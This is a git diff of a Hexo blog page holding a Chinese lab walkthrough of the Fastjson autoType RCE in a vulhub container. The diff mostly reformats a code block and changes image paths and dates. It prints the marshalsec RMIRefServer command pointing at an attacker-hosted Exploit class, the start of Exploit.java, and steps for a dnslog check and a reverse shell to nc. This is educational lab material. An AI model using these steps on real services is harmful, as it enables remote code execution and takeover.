@@ -53,9 +53,9 @@
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
 <meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Lifelong learning" type="application/atom+xml">
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-</head>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 
 <body>
@@ -404,7 +404,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    503
+                    507
                 </div>
                 
 
@@ -428,13 +428,20 @@
 漏洞出现在Fastjson autoType处理json对象时，没有对@type字段进行完整的安全性验证，我们可以传入危险的类并调用危险类连接远程RMI服务器，通过恶意类执行恶意代码，进而实现远程代码执行漏洞
 影响版本为fastjson &lt; 1.2.25<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="0x02-漏洞环境搭建"><a href="#0x02-漏洞环境搭建" class="headerlink" title="0x02 漏洞环境搭建"></a>0x02 漏洞环境搭建</h2><p>这里用vulhub靶场的docker镜像进行，记得把java版本换成1.8.0_20<br>更换java版本：<br>curl <a target="_blank" rel="noopener" href="http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz">http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz</a> -o jdk-8u20-linux-x64.tar.gz<br>tar zxvf jdk-8u20-linux-x64.tar.gz<br>rm -rf /usr/bin/java*<br>ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin<br>javac -version<br>java -version</p>
+<h2 id="0x02-漏洞环境搭建"><a href="#0x02-漏洞环境搭建" class="headerlink" title="0x02 漏洞环境搭建"></a>0x02 漏洞环境搭建</h2><p>这里用vulhub靶场的docker镜像进行，记得把java版本换成1.8.0_20<br>更换java版本：</p>
+<pre class="line-numbers language-none"><code class="language-none">curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz
+tar zxvf jdk-8u20-linux-x64.tar.gz
+rm -rf /usr/bin/java*
+ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin
+javac -version
+java -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>然后用docker容器启动fastjson靶场</p>
-<p><img src="/home/ying/snap/typora/76/.config/Typora/typora-user-images/image-20230201160739146.png" alt="image-20230201160739146"></p>
+<p><img src="/images/1.png"></p>
 <p>用burp抓包放到Repeater模块进行测试</p>
-<p><img src="/home/ying/snap/typora/76/.config/Typora/typora-user-images/image-20230201161301524.png" alt="image-20230201161301524"></p>
+<p><img src="/images/2.png"></p>
 <p>先用ldap协议向第三方dnslog发送数据看看会不会有回显</p>
-<p><img src="/home/ying/snap/typora/76/.config/Typora/typora-user-images/image-20230201165229872.png" alt="image-20230201165229872"></p>
+<p><img src="/images/3.png"></p>
 <p>可以看到第三方dnslog收到回显</p>
 <p>下面就让我们来通过github上的<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec.git">https://github.com/mbechler/marshalsec.git</a> 来构建一个RMI服务，然后再在本地开启一个web服务构造一个poc从而实现对fastjson实现RCE，话不多说，开干。</p>
 <p>先下载marshalsec</p>
@@ -444,7 +451,7 @@
 <pre class="line-numbers language-none"><code class="language-none">apt-get install maven
 mvn clean package -DskipTests<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/home/ying/snap/typora/76/.config/Typora/typora-user-images/image-20230201184231010.png" alt="image-20230201184231010"></p>
+<p><img src="/images/4.png"></p>
 <p>mvn编译成功</p>
 <p>下面构建exp攻击脚本Exploit.java</p>
 <pre class="line-numbers language-none"><code class="language-none">public class Exploit {
@@ -462,19 +469,19 @@ mvn clean package -DskipTests<span aria-hidden="true" class="line-numbers-rows">
 
 <p>然后进行javac  Exploit.java编译得到Exploit.class文件</p>
 <p>在exp攻击脚本目录下开启一个web服务</p>
-<p><img src="/home/ying/snap/typora/76/.config/Typora/typora-user-images/image-20230201185551163.png" alt="image-20230201185551163"></p>
+<p><img src="/images/5.png"></p>
 <p>开启一个RMI服务,监听8888端口</p>
 <pre class="line-numbers language-none"><code class="language-none">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.52.136:8000/#Exploit" 8888<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/home/ying/snap/typora/76/.config/Typora/typora-user-images/image-20230201185834187.png" alt="image-20230201185834187"></p>
+<p><img src="/images/6.png"></p>
 <p>用nc开启监听6666端口</p>
-<p><img src="/home/ying/snap/typora/76/.config/Typora/typora-user-images/image-20230201185931247.png" alt="image-20230201185931247"></p>
+<p><img src="/images/7.png"></p>
 <p>burp构建发包请求</p>
-<p><img src="/home/ying/snap/typora/76/.config/Typora/typora-user-images/image-20230201190356317.png" alt="image-20230201190356317"></p>
+<p><img src="/images/8.png"></p>
 <p>RMI服务器收到请求</p>
-<p><img src="/home/ying/snap/typora/76/.config/Typora/typora-user-images/image-20230201190454442.png" alt="image-20230201190454442"></p>
+<p><img src="/images/9.png"></p>
 <p>通过exp脚本反弹给nc一个shell</p>
-<p><img src="/home/ying/snap/typora/76/.config/Typora/typora-user-images/image-20230201190540282.png" alt="image-20230201190540282"></p>
+<p><img src="/images/10.png"></p>
 
                 
             </div>
@@ -682,7 +689,7 @@ mvn clean package -DskipTests<span aria-hidden="true" class="line-numbers-rows">
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/01/07/hello-world/">
+                <a href="/2023/01/12/hello-world/">
                     <div class="card-image">
                         
                         
@@ -699,7 +706,7 @@ mvn clean package -DskipTests<span aria-hidden="true" class="line-numbers-rows">
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-07
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-12
                             </span>
                         <span class="publish-author">
                             
@@ -905,7 +912,7 @@ mvn clean package -DskipTests<span aria-hidden="true" class="line-numbers-rows">
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">576</span>
+                        class="white-color">580</span>
             
             
             
